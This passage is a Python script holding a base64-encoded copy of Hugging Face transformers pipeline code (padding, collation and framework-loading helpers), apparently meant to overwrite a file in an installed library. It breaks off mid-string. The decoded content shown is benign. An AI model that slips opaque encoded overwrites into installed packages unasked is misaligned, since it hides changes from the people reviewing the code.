#!/usr/bin/env python
import base64
import sys

site_p_dir = '/transformers/pipelines'
code = 'IyBjb2Rpbmc9dXRmLTgKIyBDb3B5cmlnaHQgMjAxOCBUaGUgSHVnZ2luZ0ZhY2UgSW5jLiB0ZWFtLgojCiMgTGljZW5zZWQgdW5kZXIgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uIDIuMCAodGhlICJMaWNlbnNlIik7CiMgeW91IG1heSBub3QgdXNlIHRoaXMgZmlsZSBleGNlcHQgaW4gY29tcGxpYW5jZSB3aXRoIHRoZSBMaWNlbnNlLgojIFlvdSBtYXkgb2J0YWluIGEgY29weSBvZiB0aGUgTGljZW5zZSBhdAojCiMgICAgIGh0dHA6Ly93d3cuYXBhY2hlLm9yZy9saWNlbnNlcy9MSUNFTlNFLTIuMAojCiMgVW5sZXNzIHJlcXVpcmVkIGJ5IGFwcGxpY2FibGUgbGF3IG9yIGFncmVlZCB0byBpbiB3cml0aW5nLCBzb2Z0d2FyZQojIGRpc3RyaWJ1dGVkIHVuZGVyIHRoZSBMaWNlbnNlIGlzIGRpc3RyaWJ1dGVkIG9uIGFuICJBUyBJUyIgQkFTSVMsCiMgV0lUSE9VVCBXQVJSQU5USUVTIE9SIENPTkRJVElPTlMgT0YgQU5ZIEtJTkQsIGVpdGhlciBleHByZXNzIG9yIGltcGxpZWQuCiMgU2VlIHRoZSBMaWNlbnNlIGZvciB0aGUgc3BlY2lmaWMgbGFuZ3VhZ2UgZ292ZXJuaW5nIHBlcm1pc3Npb25zIGFuZAojIGxpbWl0YXRpb25zIHVuZGVyIHRoZSBMaWNlbnNlLgppbXBvcnQgY29sbGVjdGlvbnMKaW1wb3J0IGNzdgppbXBvcnQgaW1wb3J0bGliCmltcG9ydCBqc29uCmltcG9ydCBvcwppbXBvcnQgcGlja2xlCmltcG9ydCBzeXMKaW1wb3J0IHR5cGVzCmltcG9ydCB3YXJuaW5ncwpmcm9tIGFiYyBpbXBvcnQgQUJDLCBhYnN0cmFjdG1ldGhvZApmcm9tIGNvbGxlY3Rpb25zIGltcG9ydCBVc2VyRGljdApmcm9tIGNvbnRleHRsaWIgaW1wb3J0IGNvbnRleHRtYW5hZ2VyCmZyb20gb3MucGF0aCBpbXBvcnQgYWJzcGF0aCwgZXhpc3RzCmZyb20gdHlwaW5nIGltcG9ydCBUWVBFX0NIRUNLSU5HLCBBbnksIERpY3QsIExpc3QsIE9wdGlvbmFsLCBUdXBsZSwgVW5pb24KCmZyb20gcGFja2FnaW5nIGltcG9ydCB2ZXJzaW9uCgpmcm9tIC4uZHluYW1pY19tb2R1bGVfdXRpbHMgaW1wb3J0IGN1c3RvbV9vYmplY3Rfc2F2ZQpmcm9tIC4uZmVhdHVyZV9leHRyYWN0aW9uX3V0aWxzIGltcG9ydCBQcmVUcmFpbmVkRmVhdHVyZUV4dHJhY3Rvcgpmcm9tIC4ubW9kZWxjYXJkIGltcG9ydCBNb2RlbENhcmQKZnJvbSAuLm1vZGVscy5hdXRvLmNvbmZpZ3VyYXRpb25fYXV0byBpbXBvcnQgQXV0b0NvbmZpZwpmcm9tIC4udG9rZW5pemF0aW9uX3V0aWxzIGltcG9ydCBQcmVUcmFpbmVkVG9rZW5pemVyCmZyb20gLi51dGlscyBpbXBvcnQgTW9kZWxPdXRwdXQsIGFkZF9lbmRfZG9jc3RyaW5ncywgaXNfdGZfYXZhaWxhYmxlLCBpc190b3JjaF9hdmFpbGFibGUsIGxvZ2dpbmcKCmltcG9ydCB0b3JjaC5ubiBhcyBubgoKCkdlbmVyaWNUZW5zb3IgPSBVbmlvbltMaXN0WyJHZW5lcmljVGVuc29yIl0sICJ0b3JjaC5UZW5zb3IiLCAidGYuVGVuc29yIl0KCmlmIGlzX3RmX2F2YWlsYWJsZSgpOgogICAgaW1wb3J0IHRlbnNvcmZsb3cgYXMgdGYKCiAgICBmcm9tIC4ubW9kZWxzLmF1dG8ubW9kZWxpbmdfdGZfYXV0byBpbXBvcnQgVEZBdXRvTW9kZWwKCmlmIGlzX3RvcmNoX2F2YWlsYWJsZSgpOgogICAgaW1wb3J0IHRvcmNoCiAgICBmcm9tIHRvcmNoLnV0aWxzLmRhdGEgaW1wb3J0IERhdGFMb2FkZXIsIERhdGFzZXQKCiAgICBmcm9tIC4ubW9kZWxzLmF1dG8ubW9kZWxpbmdfYXV0byBpbXBvcnQgQXV0b01vZGVsCgogICAgIyBSZS1leHBvcnQgZm9yIGJhY2t3YXJkIGNvbXBhdGliaWxpdHkKICAgIGZyb20gLnB0X3V0aWxzIGltcG9ydCBLZXlEYXRhc2V0CmVsc2U6CiAgICBEYXRhc2V0ID0gTm9uZQogICAgS2V5RGF0YXNldCA9IE5vbmUKCmlmIFRZUEVfQ0hFQ0tJTkc6CiAgICBmcm9tIC4ubW9kZWxpbmdfdGZfdXRpbHMgaW1wb3J0IFRGUHJlVHJhaW5lZE1vZGVsCiAgICBmcm9tIC4ubW9kZWxpbmdfdXRpbHMgaW1wb3J0IFByZVRyYWluZWRNb2RlbAoKCmxvZ2dlciA9IGxvZ2dpbmcuZ2V0X2xvZ2dlcihfX25hbWVfXykKCgpkZWYgbm9fY29sbGF0ZV9mbihpdGVtcyk6CiAgICBpZiBsZW4oaXRlbXMpICE9IDE6CiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVGhpcyBjb2xsYXRlX2ZuIGlzIG1lYW50IHRvIGJlIHVzZWQgd2l0aCBiYXRjaF9zaXplPTEiKQogICAgcmV0dXJuIGl0ZW1zWzBdCgoKZGVmIF9wYWQoaXRlbXMsIGtleSwgcGFkZGluZ192YWx1ZSwgcGFkZGluZ19zaWRlKToKICAgIGJhdGNoX3NpemUgPSBsZW4oaXRlbXMpCiAgICBpZiBpc2luc3RhbmNlKGl0ZW1zWzBdW2tleV0sIHRvcmNoLlRlbnNvcik6CiAgICAgICAgIyBPdGhlcnMgaW5jbHVkZSBgYXR0ZW50aW9uX21hc2tgIGV0Yy4uLgogICAgICAgIHNoYXBlID0gaXRlbXNbMF1ba2V5XS5zaGFwZQogICAgICAgIGRpbSA9IGxlbihzaGFwZSkKICAgICAgICBpZiBrZXkgPT0gInBpeGVsX3ZhbHVlcyI6CiAgICAgICAgICAgICMgVGhpcyBpcyBwcm9iYWJsZSBpbWFnZSBzbyBwYWRkaW5nIHNob3VsZG4ndCBiZSBuZWNlc3NhcnkKICAgICAgICAgICAgIyBCLCBDLCBILCBXCiAgICAgICAgICAgIHJldHVybiB0b3JjaC5jYXQoW2l0ZW1ba2V5XSBmb3IgaXRlbSBpbiBpdGVtc10sIGRpbT0wKQogICAgICAgIG1heF9sZW5ndGggPSBtYXgoaXRlbVtrZXldLnNoYXBlWzFdIGZvciBpdGVtIGluIGl0ZW1zKQogICAgICAgIG1pbl9sZW5ndGggPSBtaW4oaXRlbVtrZXldLnNoYXBlWzFdIGZvciBpdGVtIGluIGl0ZW1zKQogICAgICAgIGR0eXBlID0gaXRlbXNbMF1ba2V5XS5kdHlwZQoKICAgICAgICBpZiBkaW0gPT0gMjoKICAgICAgICAgICAgaWYgbWF4X2xlbmd0aCA9PSBtaW5fbGVuZ3RoOgogICAgICAgICAgICAgICAgIyBCeXBhc3MgZm9yIGBJbWFnZUdQVGAgd2hpY2ggZG9lc24ndCBwcm92aWRlIGEgcGFkZGluZyB2YWx1ZSwgeWV0CiAgICAgICAgICAgICAgICAjIHdlIGNhbiBjb25zaXN0ZW50bHkgcGFkIHNpbmNlIHRoZSBzaXplIHNob3VsZCBiZSBtYXRjaGluZwogICAgICAgICAgICAgICAgcmV0dXJuIHRvcmNoLmNhdChbaXRlbVtrZXldIGZvciBpdGVtIGluIGl0ZW1zXSwgZGltPTApCiAgICAgICAgICAgIHRlbnNvciA9IHRvcmNoLnplcm9zKChiYXRjaF9zaXplLCBtYXhfbGVuZ3RoKSwgZHR5cGU9ZHR5cGUpICsgcGFkZGluZ192YWx1ZQogICAgICAgIGVsaWYgZGltID09IDM6CiAgICAgICAgICAgIHRlbnNvciA9IHRvcmNoLnplcm9zKChiYXRjaF9zaXplLCBtYXhfbGVuZ3RoLCBzaGFwZVstMV0pLCBkdHlwZT1kdHlwZSkgKyBwYWRkaW5nX3ZhbHVlCgogICAgICAgIGZvciBpLCBpdGVtIGluIGVudW1lcmF0ZShpdGVtcyk6CiAgICAgICAgICAgIGlmIGRpbSA9PSAyOgogICAgICAgICAgICAgICAgaWYgcGFkZGluZ19zaWRlID09ICJsZWZ0IjoKICAgICAgICAgICAgICAgICAgICB0ZW5zb3JbaSwgLWxlbihpdGVtW2tleV1bMF0pIDpdID0gaXRlbVtrZXldWzBdLmNsb25lKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgdGVuc29yW2ksIDogbGVuKGl0ZW1ba2V5XVswXSldID0gaXRlbVtrZXldWzBdLmNsb25lKCkKICAgICAgICAgICAgZWxpZiBkaW0gPT0gMzoKICAgICAgICAgICAgICAgIGlmIHBhZGRpbmdfc2lkZSA9PSAibGVmdCI6CiAgICAgICAgICAgICAgICAgICAgdGVuc29yW2ksIC1sZW4oaXRlbVtrZXldWzBdKSA6LCA6XSA9IGl0ZW1ba2V5XVswXS5jbG9uZSgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHRlbnNvcltpLCA6IGxlbihpdGVtW2tleV1bMF0pLCA6XSA9IGl0ZW1ba2V5XVswXS5jbG9uZSgpCiAgICAgICAgcmV0dXJuIHRlbnNvcgogICAgZWxzZToKICAgICAgICByZXR1cm4gW2l0ZW1ba2V5XSBmb3IgaXRlbSBpbiBpdGVtc10KCgpkZWYgcGFkX2NvbGxhdGVfZm4odG9rZW5pemVyLCBmZWF0dXJlX2V4dHJhY3Rvcik6CiAgICAjIFRva2VuaXplcgogICAgdF9wYWRkaW5nX3NpZGUgPSBOb25lCiAgICAjIEZlYXR1cmUgZXh0cmFjdG9yCiAgICBmX3BhZGRpbmdfc2lkZSA9IE5vbmUKICAgIGlmIHRva2VuaXplciBpcyBOb25lIGFuZCBmZWF0dXJlX2V4dHJhY3RvciBpcyBOb25lOgogICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlBpcGVsaW5lIHdpdGhvdXQgdG9rZW5pemVyIG9yIGZlYXR1cmVfZXh0cmFjdG9yIGNhbm5vdCBkbyBiYXRjaGluZyIpCiAgICBpZiB0b2tlbml6ZXIgaXMgbm90IE5vbmU6CiAgICAgICAgaWYgdG9rZW5pemVyLnBhZF90b2tlbl9pZCBpcyBOb25lOgogICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKAogICAgICAgICAgICAgICAgIlBpcGVsaW5lIHdpdGggdG9rZW5pemVyIHdpdGhvdXQgcGFkX3Rva2VuIGNhbm5vdCBkbyBiYXRjaGluZy4gWW91IGNhbiB0cnkgdG8gc2V0IGl0IHdpdGggIgogICAgICAgICAgICAgICAgImBwaXBlLnRva2VuaXplci5wYWRfdG9rZW5faWQgPSBtb2RlbC5jb25maWcuZW9zX3Rva2VuX2lkYC4iCiAgICAgICAgICAgICkKICAgICAgICBlbHNlOgogICAgICAgICAgICB0X3BhZGRpbmdfdmFsdWUgPSB0b2tlbml6ZXIucGFkX3Rva2VuX2lkCiAgICAgICAgICAgIHRfcGFkZGluZ19zaWRlID0gdG9rZW5pemVyLnBhZGRpbmdfc2lkZQogICAgaWYgZmVhdHVyZV9leHRyYWN0b3IgaXMgbm90IE5vbmU6CiAgICAgICAgIyBGZWF0dXJlIGV4dHJhY3RvciBjYW4gYmUgaW1hZ2VzLCB3aGVyZSBubyBwYWRkaW5nIGlzIGV4cGVjdGVkCiAgICAgICAgZl9wYWRkaW5nX3ZhbHVlID0gZ2V0YXR0cihmZWF0dXJlX2V4dHJhY3RvciwgInBhZGRpbmdfdmFsdWUiLCBOb25lKQogICAgICAgIGZfcGFkZGluZ19zaWRlID0gZ2V0YXR0cihmZWF0dXJlX2V4dHJhY3RvciwgInBhZGRpbmdfc2lkZSIsIE5vbmUpCgogICAgaWYgdF9wYWRkaW5nX3NpZGUgaXMgbm90IE5vbmUgYW5kIGZfcGFkZGluZ19zaWRlIGlzIG5vdCBOb25lIGFuZCB0X3BhZGRpbmdfc2lkZSAhPSBmX3BhZGRpbmdfc2lkZToKICAgICAgICByYWlzZSBWYWx1ZUVycm9yKAogICAgICAgICAgICBmIlRoZSBmZWF0dXJlIGV4dHJhY3RvciwgYW5kIHRva2VuaXplciBkb24ndCBhZ3JlZSBvbiBwYWRkaW5nIHNpZGUge3RfcGFkZGluZ19zaWRlfSAhPSB7Zl9wYWRkaW5nX3NpZGV9IgogICAgICAgICkKICAgIHBhZGRpbmdfc2lkZSA9ICJyaWdodCIKICAgIGlmIHRfcGFkZGluZ19zaWRlIGlzIG5vdCBOb25lOgogICAgICAgIHBhZGRpbmdfc2lkZSA9IHRfcGFkZGluZ19zaWRlCiAgICBpZiBmX3BhZGRpbmdfc2lkZSBpcyBub3QgTm9uZToKICAgICAgICBwYWRkaW5nX3NpZGUgPSBmX3BhZGRpbmdfc2lkZQoKICAgIGRlZiBpbm5lcihpdGVtcyk6CiAgICAgICAga2V5cyA9IHNldChpdGVtc1swXS5rZXlzKCkpCiAgICAgICAgZm9yIGl0ZW0gaW4gaXRlbXM6CiAgICAgICAgICAgIGlmIHNldChpdGVtLmtleXMoKSkgIT0ga2V5czoKICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoCiAgICAgICAgICAgICAgICAgICAgZiJUaGUgZWxlbWVudHMgb2YgdGhlIGJhdGNoIGNvbnRhaW4gZGlmZmVyZW50IGtleXMuIENhbm5vdCBiYXRjaCB0aGVtICh7c2V0KGl0ZW0ua2V5cygpKX0gIT0iCiAgICAgICAgICAgICAgICAgICAgZiIge2tleXN9KSIKICAgICAgICAgICAgICAgICkKICAgICAgICAjIGlucHV0X3ZhbHVlcywgaW5wdXRfcGl4ZWxzLCBpbnB1dF9pZHMsIC4uLgogICAgICAgIHBhZGRlZCA9IHt9CiAgICAgICAgZm9yIGtleSBpbiBrZXlzOgogICAgICAgICAgICBpZiBrZXkgaW4geyJpbnB1dF9pZHMifToKICAgICAgICAgICAgICAgICMgSW1hZ2VHUFQgdXNlcyBhIGZlYXR1cmUgZXh0cmFjdG9yCiAgICAgICAgICAgICAgICBpZiBmZWF0dXJlX2V4dHJhY3RvciBpcyBub3QgTm9uZToKICAgICAgICAgICAgICAgICAgICBfcGFkZGluZ192YWx1ZSA9IGZfcGFkZGluZ192YWx1ZQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBfcGFkZGluZ192YWx1ZSA9IHRfcGFkZGluZ192YWx1ZQogICAgICAgICAgICBlbGlmIGtleSBpbiB7ImlucHV0X3ZhbHVlcyIsICJwaXhlbF92YWx1ZXMiLCAiaW5wdXRfZmVhdHVyZXMifToKICAgICAgICAgICAgICAgIF9wYWRkaW5nX3ZhbHVlID0gZl9wYWRkaW5nX3ZhbHVlCiAgICAgICAgICAgIGVsaWYga2V5IGluIHsicF9tYXNrIiwgInNwZWNpYWxfdG9rZW5zX21hc2sifToKICAgICAgICAgICAgICAgIF9wYWRkaW5nX3ZhbHVlID0gMQogICAgICAgICAgICBlbGlmIGtleSBpbiB7ImF0dGVudGlvbl9tYXNrIiwgInRva2VuX3R5cGVfaWRzIn06CiAgICAgICAgICAgICAgICBfcGFkZGluZ192YWx1ZSA9IDAKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICMgVGhpcyBpcyBsaWtlbHkgYW5vdGhlciByYW5kb20ga2V5IG1heWJlIGV2ZW4gdXNlciBwcm92aWRlZAogICAgICAgICAgICAgICAgX3BhZGRpbmdfdmFsdWUgPSAwCiAgICAgICAgICAgIHBhZGRlZFtrZXldID0gX3BhZChpdGVtcywga2V5LCBfcGFkZGluZ192YWx1ZSwgcGFkZGluZ19zaWRlKQogICAgICAgIHJldHVybiBwYWRkZWQKCiAgICByZXR1cm4gaW5uZXIKCgpkZWYgaW5mZXJfZnJhbWV3b3JrX2xvYWRfbW9kZWwoCiAgICBtb2RlbCwKICAgIGNvbmZpZzogQXV0b0NvbmZpZywKICAgIG1vZGVsX2NsYXNzZXM6IE9wdGlvbmFsW0RpY3Rbc3RyLCBUdXBsZVt0eXBlXV1dID0gTm9uZSwKICAgIHRhc2s6IE9wdGlvbmFsW3N0cl0gPSBOb25lLAogICAgZnJhbWV3b3JrOiBPcHRpb25hbFtzdHJdID0gTm9uZSwKICAgICoqbW9kZWxfa3dhcmdzLAopOgogICAgIiIiCiAgICBTZWxlY3QgZnJhbWV3b3JrIChUZW5zb3JGbG93IG9yIFB5VG9yY2gpIHRvIHVzZSBmcm9tIHRoZSBgbW9kZWxgIHBhc3NlZC4gUmV0dXJucyBhIHR1cGxlIChmcmFtZXdvcmssIG1vZGVsKS4KCiAgICBJZiBgbW9kZWxgIGlzIGluc3RhbnRpYXRlZCwgdGhpcyBmdW5jdGlvbiB3aWxsIGp1c3QgaW5mZXIgdGhlIGZyYW1ld29yayBmcm9tIHRoZSBtb2RlbCBjbGFzcy4gT3RoZXJ3aXNlIGBtb2RlbGAgaXMKICAgIGFjdHVhbGx5IGEgY2hlY2twb2ludCBuYW1lIGFuZCB0aGlzIG1ldGhvZCB3aWxsIHRyeSB0byBpbnN0YW50aWF0ZSBpdCB1c2luZyBgbW9kZWxfY2xhc3Nlc2AuIFNpbmNlIHdlIGRvbid0IHdhbnQgdG8KICAgIGluc3RhbnRpYXRlIHRoZSBtb2RlbCB0d2ljZSwgdGhpcyBtb2RlbCBpcyByZXR1cm5lZCBmb3IgdXNlIGJ5IHRoZSBwaXBlbGluZS4KCiAgICBJZiBib3RoIGZyYW1ld29ya3MgYXJlIGluc3RhbGxlZCBhbmQgYXZhaWxhYmxlIGZvciBgbW9kZWxgLCBQeVRvcmNoIGlzIHNlbGVjdGVkLgoKICAgIEFyZ3M6CiAgICAgICAgbW9kZWwgKGBzdHJgLCBbYFByZVRyYWluZWRNb2RlbGBdIG9yIFtgVEZQcmVUcmFpbmVkTW9kZWxgXSk6CiAgICAgICAgICAgIFRoZSBtb2RlbCB0byBpbmZlciB0aGUgZnJhbWV3b3JrIGZyb20uIElmIGBzdHJgLCBhIGNoZWNrcG9pbnQgbmFtZS4gVGhlIG1vZGVsIHRvIGluZmVyIHRoZSBmcmFtZXdyb2sgZnJvbS4KICAgICAgICBjb25maWcgKFtgQXV0b0NvbmZpZ2BdKToKICAgICAgICAgICAgVGhlIGNvbmZpZyBhc3NvY2lhdGVkIHdpdGggdGhlIG1vZGVsIHRvIGhlbHAgdXNpbmcgdGhlIGNvcnJlY3QgY2xhc3MKICAgICAgICBtb2RlbF9jbGFzc2VzIChkaWN0aW9uYXJ5IGBzdHJgIHRvIGB0eXBlYCwgKm9wdGlvbmFsKik6CiAgICAgICAgICAgIEEgbWFwcGluZyBmcmFtZXdvcmsgdG8gY2xhc3MudAogICAgICAgIHRhc2sgKGBzdHJgKToKICAgICAgICAgICAgVGhlIHRhc2sgZGVmaW5pbmcgd2hpY2ggcGlwZWxpbmUgd2lsbCBiZSByZXR1cm5lZC4KICAgICAgICBtb2RlbF9rd2FyZ3M6CiAgICAgICAgICAgIEFkZGl0aW9uYWwgZGljdGlvbmFyeSBvZiBrZXl3b3JkIGFyZ3VtZW50cyBwYXNzZWQgYWxvbmcgdG8gdGhlIG1vZGVsJ3MgYGZyb21fcHJldHJhaW5lZCguLi4sCiAgICAgICAgICAgICoqbW9kZWxfa3dhcmdzKWAgZnVuY3Rpb24uCgogICAgUmV0dXJuczoKICAgICAgICBgVHVwbGVgOiBBIHR1cGxlIGZyYW1ld29yaywgbW9kZWwuCiAgICAiIiIKICAgIGlmIG5vdCBpc190Zl9hdmFpbGFibGUoKSBhbmQgbm90IGlzX3RvcmNoX2F2YWlsYWJsZSgpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigKICAgICAgICAgICAgIkF0IGxlYXN0IG9uZSBvZiBUZW5zb3JGbG93IDIuMCBvciBQeVRvcmNoIHNob3VsZCBiZSBpbnN0YWxsZWQuICIKICAgICAgICAgICAgIlRvIGluc3RhbGwgVGVuc29yRmxvdyAyLjAsIHJlYWQgdGhlIGluc3RydWN0aW9ucyBhdCBodHRwczovL3d3dy50ZW5zb3JmbG93Lm9yZy9pbnN0YWxsLyAiCiAgICAgICAgICAgICJUbyBpbnN0YWxsIFB5VG9yY2gsIHJlYWQgdGhlIGluc3RydWN0aW9ucyBhdCBodHRwczovL3B5dG9yY2gub3JnLy4iCiAgICAgICAgKQogICAgaWYgaXNpbnN0YW5jZShtb2RlbCwgc3RyKToKICAgICAgICBtb2RlbF9rd2FyZ3NbIl9mcm9tX3BpcGVsaW5lIl0gPSB0YXNrCiAgICAgICAgY2xhc3NfdHVwbGUgPSAoKQogICAgICAgIGxvb2tfcHQgPSBpc190b3JjaF9hdmFpbGFibGUoKSBhbmQgZnJhbWV3b3JrIGluIHsicHQiLCBOb25lfQogICAgICAgIGxvb2tfdGYgPSBpc190Zl9hdmFpbGFibGUoKSBhbmQgZnJhbWV3b3JrIGluIHsidGYiLCBOb25lfQogICAgICAgIGlmIG1vZGVsX2NsYXNzZXM6CiAgICAgICAgICAgIGlmIGxvb2tfcHQ6CiAgICAgICAgICAgICAgICBjbGFzc190dXBsZSA9IGNsYXNzX3R1cGxlICsgbW9kZWxfY2xhc3Nlcy5nZXQoInB0IiwgKEF1dG9Nb2RlbCwpKQogICAgICAgICAgICBpZiBsb29rX3RmOgogICAgICAgICAgICAgICAgY2xhc3NfdHVwbGUgPSBjbGFzc190dXBsZSArIG1vZGVsX2NsYXNzZXMuZ2V0KCJ0ZiIsIChURkF1dG9Nb2RlbCwpKQogICAgICAgIGlmIGNvbmZpZy5hcmNoaXRlY3R1cmVzOgogICAgICAgICAgICBjbGFzc2VzID0gW10KICAgICAgICAgICAgZm9yIGFyY2hpdGVjdHVyZSBpbiBjb25maWcuYXJjaGl0ZWN0dXJlczoKICAgICAgICAgICAgICAgIHRyYW5zZm9ybWVyc19tb2R1bGUgPSBpbXBvcnRsaWIuaW1wb3J0X21vZHVsZSgidHJhbnNmb3JtZXJzIikKICAgICAgICAgICAgICAgIGlmIGxvb2tfcHQ6CiAgICAgICAgICAgICAgICAgICAgX2NsYXNzID0gZ2V0YXR0cih0cmFuc2Zvcm1lcnNfbW9kdWxlLCBhcmNoaXRlY3R1cmUsIE5vbmUpCiAgICAgICAgICAgICAgICAgICAgaWYgX2NsYXNzIGlzIG5vdCBOb25lOgogICAgICAgICAgICAgICAgICAgICAgICBjbGFzc2VzLmFwcGVuZChfY2xhc3MpCiAgICAgICAgICAgICAgICBpZiBsb29rX3RmOgogICAgICAgICAgICAgICAgICAgIF9jbGFzcyA9IGdldGF0dHIodHJhbnNmb3JtZXJzX21vZHVsZSwgZiJURnthcmNoaXRlY3R1cmV9IiwgTm9uZSkKICAgICAgICAgICAgICAgICAgICBpZiBfY2xhc3MgaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzZXMuYXBwZW5kKF9jbGFzcykKICAgICAgICAgICAgY2xhc3NfdHVwbGUgPSBjbGFzc190dXBsZSArIHR1cGxlKGNsYXNzZXMpCgogICAgICAgIGlmIGxlbihjbGFzc190dXBsZSkgPT0gMDoKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihmIlBpcGVsaW5lIGNhbm5vdCBpbmZlciBzdWl0YWJsZSBtb2RlbCBjbGFzc2VzIGZyb20ge21vZGVsfSIpCgogICAgICAgIGZvciBtb2RlbF9jbGFzcyBpbiBjbGFzc190dXBsZToKICAgICAgICAgICAga3dhcmdzID0gbW9kZWxfa3dhcmdzLmNvcHkoKQogICAgICAgICAgICBpZiBmcmFtZXdvcmsgPT0gInB0IiBhbmQgbW9kZWwuZW5kc3dpdGgoIi5oNSIpOgogICAgICAgICAgICAgICAga3dhcmdzWyJmcm9tX3RmIl0gPSBUcnVlCiAgICAgICAgICAgICAgICBsb2dnZXIud2FybmluZygKICAgICAgICAgICAgICAgICAgICAiTW9kZWwgbWlnaHQgYmUgYSBUZW5zb3JGbG93IG1vZGVsIChlbmRpbmcgd2l0aCBgLmg1YCkgYnV0IFRlbnNvckZsb3cgaXMgbm90IGF2YWlsYWJsZS4gIgogICAgICAgICAgICAgICAgICAgICJUcnlpbmcgdG8gbG9hZCB0aGUgbW9kZWwgd2l0aCBQeVRvcmNoLiIKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgZWxpZiBmcmFtZXdvcmsgPT0gInRmIiBhbmQgbW9kZWwuZW5kc3dpdGgoIi5iaW4iKToKICAgICAgICAgICAgICAgIGt3YXJnc1siZnJvbV9wdCJdID0gVHJ1ZQogICAgICAgICAgICAgICAgbG9nZ2VyLndhcm5pbmcoCiAgICAgICAgICAgICAgICAgICAgIk1vZGVsIG1pZ2h0IGJlIGEgUHlUb3JjaCBtb2RlbCAoZW5kaW5nIHdpdGggYC5iaW5gKSBidXQgUHlUb3JjaCBpcyBub3QgYXZhaWxhYmxlLiAiCiAgICAgICAgICAgICAgICAgICAgIlRyeWluZyB0byBsb2FkIHRoZSBtb2RlbCB3aXRoIFRlbnNvcmZsb3cuIgogICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbW9kZWwgPSBtb2RlbF9jbGFzcy5mcm9tX3ByZXRyYWluZWQobW9kZWwsICoqa3dhcmdzKQogICAgICAgICAgICAgICAgaWYgaGFzYXR0cihtb2RlbCwgImV2YWwiKToKICAgICAgICAgICAgICAgICAgICBtb2RlbCA9IG1vZGVsLmV2YWwoKQogICAgICAgICAgICAgICAgIyBTdG9wIGxvYWRpbmcgb24gdGhlIGZpcnN0IHN1Y2Nlc3NmdWwgbG9hZC4KICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGV4Y2VwdCAoT1NFcnJvciwgVmFsdWVFcnJvcik6CiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBpZiBpc2luc3RhbmNlKG1vZGVsLCBzdHIpOgogICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKGYiQ291bGQgbm90IGxvYWQgbW9kZWwge21vZGVsfSB3aXRoIGFueSBvZiB0aGUgZm9sbG93aW5nIGNsYXNzZXM6IHtjbGFzc190dXBsZX0uIikKCiAgICBmcmFtZXdvcmsgPSAidGYiIGlmIG1vZGVsLl9fY2xhc3NfXy5fX25hbWVfXy5zdGFydHN3aXRoKCJURiIpIGVsc2UgInB0IgogICAgcmV0dXJuIGZyYW1ld29yaywgbW9kZWwKCgpkZWYgaW5mZXJfZnJhbWV3b3JrX2Zyb21fbW9kZWwoCiAgICBtb2RlbCwKICAgIG1vZGVsX2NsYXNzZXM6IE9wdGlvbmFsW0RpY3Rbc3RyLCBUdXBsZVt0eXBlXV1dID0gTm9uZSwKICAgIHRhc2s6IE9wdGlvbmFsW3N0cl0gPSBOb25lLAogICAgZnJhbWV3b3JrOiBPcHRpb25hbFtzdHJdID0gTm9uZSwKICAgICoqbW9kZWxfa3dhcmdzLAopOgogICAgIiIiCiAgICBTZWxlY3QgZnJhbWV3b3JrIChUZW5zb3JGbG93IG9yIFB5VG9yY2gpIHRvIHVzZSBmcm9tIHRoZSBgbW9kZWxgIHBhc3NlZC4gUmV0dXJucyBhIHR1cGxlIChmcmFtZXdvcmssIG1vZGVsKS4KCiAgICBJZiBgbW9kZWxgIGlzIGluc3RhbnRpYXRlZCwgdGhpcyBmdW5jdGlvbiB3aWxsIGp1c3QgaW5mZXIgdGhlIGZyYW1ld29yayBmcm9tIHRoZSBtb2RlbCBjbGFzcy4gT3RoZXJ3aXNlIGBtb2RlbGAgaXMKICAgIGFjdHVhbGx5IGEgY2hlY2twb2ludCBuYW1lIGFuZCB0aGlzIG1ldGhvZCB3aWxsIHRyeSB0byBpbnN0YW50aWF0ZSBpdCB1c2luZyBgbW9kZWxfY2xhc3Nlc2AuIFNpbmNlIHdlIGRvbid0IHdhbnQgdG8KICAgIGluc3RhbnRpYXRlIHRoZSBtb2RlbCB0d2ljZSwgdGhpcyBtb2RlbCBpcyByZXR1cm5lZCBmb3IgdXNlIGJ5IHRoZSBwaXBlbGluZS4KCiAgICBJZiBib3RoIGZyYW1ld29ya3MgYXJlIGluc3RhbGxlZCBhbmQgYXZhaWxhYmxlIGZvciBgbW9kZWxgLCBQeVRvcmNoIGlzIHNlbGVjdGVkLgoKICAgIEFyZ3M6CiAgICAgICAgbW9kZWwgKGBzdHJgLCBbYFByZVRyYWluZWRNb2RlbGBdIG9yIFtgVEZQcmVUcmFpbmVkTW9kZWxgXSk6CiAgICAgICAgICAgIFRoZSBtb2RlbCB0byBpbmZlciB0aGUgZnJhbWV3b3JrIGZyb20uIElmIGBzdHJgLCBhIGNoZWNrcG9pbnQgbmFtZS4gVGhlIG1vZGVsIHRvIGluZmVyIHRoZSBmcmFtZXdyb2sgZnJvbS4KICAgICAgICBtb2RlbF9jbGFzc2VzIChkaWN0aW9uYXJ5IGBzdHJgIHRvIGB0eXBlYCwgKm9wdGlvbmFsKik6CiAgICAgICAgICAgIEEgbWFwcGluZyBmcmFtZXdvcmsgdG8gY2xhc3MuCiAgICAgICAgdGFzayAoYHN0cmApOgogICAgICAgICAgICBUaGUgdGFzayBkZWZpbmluZyB3aGljaCBwaXBlbGluZSB3aWxsIGJlIHJldHVybmVkLgogICAgICAgIG1vZGVsX2t3YXJnczoKICAgICAgICAgICAgQWRkaXRpb25hbCBkaWN0aW9uYXJ5IG9mIGtleXdvcmQgYXJndW1lbnRzIHBhc3NlZCBhb